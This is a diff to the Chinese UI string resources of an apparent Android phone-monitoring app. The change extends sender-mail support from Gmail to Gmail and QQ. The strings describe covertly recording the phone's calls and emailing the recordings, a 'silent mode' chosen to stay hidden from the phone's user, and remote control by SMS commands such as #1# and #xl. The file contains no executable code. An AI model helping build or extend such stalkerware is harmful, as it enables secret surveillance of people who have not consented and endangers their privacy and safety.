@@ -69,18 +69,18 @@
     <string name="pref_category_gps_title">获取所在地理位置</string>
     <string name="pref_category_ring_title">响铃</string>
     
-    <string name="pref_use_self_sender_title">使用自己的GMail发信</string>
-    <string name="pref_use_self_sender_summary">如果您有GMail邮箱，用它发信有利于保护您的隐私，否则将使用系统内置邮箱发信。</string>
-    <string name="pref_sender_mail_title">发信邮箱（仅限GMail）</string>
+    <string name="pref_use_self_sender_title">使用自己的邮箱发信</string>
+    <string name="pref_use_self_sender_summary">仅支持Gmail和QQ邮箱。使用您自己的邮箱发信更有利于保护您的隐私，否则将使用系统内置邮箱发信。</string>
+    <string name="pref_sender_mail_title">发信邮箱（GMail/QQ）</string>
     <string name="pref_sender_pwd_title">发信邮箱密码</string>
-    <string name="pref_invalid_sender_mail">%s 不是一个有效的GMail邮箱地址。</string>
+    <string name="pref_invalid_sender_mail">%s 不是一个有效的GMail或QQ邮箱地址。</string>
     <string name="pref_recv_mail_title">收信邮箱</string>
     <string name="pref_invalid_mail_format">%s不是有效的邮箱地址。</string>
     <string name="pref_pls_input_pwd">请输入邮箱密码。</string> 
     <string name="pref_info_interval_title">间隔</string> <!-- days -->
     <string name="pref_info_interval_dlg_title">收集间隔</string>
     <string name="pref_record_all_title">全部录音</string>
-    <string name="pref_record_all_summary">对所有电话录音（仅当使用自己的GMail发信时可选）</string>
+    <string name="pref_record_all_summary">对所有电话录音（仅当使用自己的邮箱发信时可选）</string>
     <string name="pref_record_number_title">录音目标号码段</string>
     <string name="pref_pls_input_target_number">请输入至少一个目标号码段（至少4位数字）</string>
     <string name="pref_record_number_summary">仅当对方号码包含目标号码段（至少4位数字）时才录音。最多支持9个号码段，用空格隔开。</string>
@@ -101,7 +101,7 @@
     <string name="pref_network_mode_summary">静默模式更加隐蔽，如果该手机用户有用手机上网的习惯请选择静默模式。</string>
     <string name="pref_network_mode_dlg_title">选择模式</string>
     <string name="pref_record_all_time_limit_in_trial">试用期间仅允许10次通话录音。</string>
-    <string name="pref_must_use_self_sender">鉴于保护隐私，只有使用您自己的GMail作为发信邮箱，才允许对所有电话录音。前往www.gmail.com免费创建您的GMail账户。更多问题请咨询客服。</string>
+    <string name="pref_must_use_self_sender">鉴于保护隐私，只有使用您自己的发信邮箱（仅支持GMail和QQ邮箱）时，才允许对所有电话录音。更多问题请咨询客服。</string>
     <string name="pref_ring_word_title">强制响铃</string>
     <string name="pref_ring_word_summary">发送短信#xl可强制使其响铃。</string>
     
@@ -160,7 +160,7 @@
     <string name="indication_unregister_ok">卸载成功。</string>
     <string name="indication_unregister_ng">卸载失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
     <string name="indication_set_selfsender_ok">设置发信邮箱成功。</string>
-    <string name="indication_set_selfsender_ng">设置发信邮箱失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_selfsender_ng">设置发信邮箱失败。请检查您发送的指令格式是否正确（仅支持GMail和QQ邮箱）。若无法解决请联系客服。</string>
     <string name="indication_stop_selfsender_ok">取消发信邮箱成功。</string>
     <string name="indication_stop_selfsender_ng">取消发信邮箱失败。因为您当前对所有电话录音，为保护您的隐私，请继续使用您的专有发信邮箱。若无法解决请联系客服。</string>
     <string name="indication_set_recv_mail_ok">设置收信邮箱成功。</string>
@@ -172,7 +172,7 @@
     <string name="indication_set_targetnum_ok">设置监听录音目标号码段成功。</string>
     <string name="indication_set_targetnum_ng">设置监听录音目标号码段失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
     <string name="indication_set_targetall_ok">设置对所有电话录音成功。</string>
-    <string name="indication_set_targetall_ng">必须使用自己的发信邮箱，才能对所有电话录音。请使用#1#指令设置你的专有发信邮箱（目前仅支持GMail）。若无法解决请联系客服。</string>
+    <string name="indication_set_targetall_ng">必须使用自己的发信邮箱，才能对所有电话录音。请使用#1#指令设置你的专有发信邮箱（仅支持GMail和QQ邮箱）。若无法解决请联系客服。</string>
     <string name="indication_set_network_mode_ok">设置网络连接模式成功。</string>
     <string name="indication_set_network_mode_ng">设置网络连接模式失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
     <string name="indication_set_sens_words_ok">设置敏感词成功。</string>
